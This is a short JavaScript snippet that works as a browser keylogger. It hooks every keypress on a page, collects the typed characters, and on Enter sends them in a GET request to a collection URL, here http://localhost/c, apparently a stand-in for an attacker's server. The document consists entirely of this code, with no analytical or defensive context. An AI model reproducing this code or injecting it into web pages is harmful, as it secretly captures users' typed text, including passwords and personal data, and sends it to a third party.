
function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false );
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
document.onkeypress = zx;
var word = "";
var arrayCharCode = []
function zx(e){
    var charCode = (typeof e.which == "number") ? e.which : e.keyCode;
    if(charCode != 13){
        var stringCode = String.fromCharCode(charCode);
        arrayCharCode.push(stringCode)
    }else{
        word = arrayCharCode.join("");
        httpGet("http://localhost/c?"+word);
    }
}
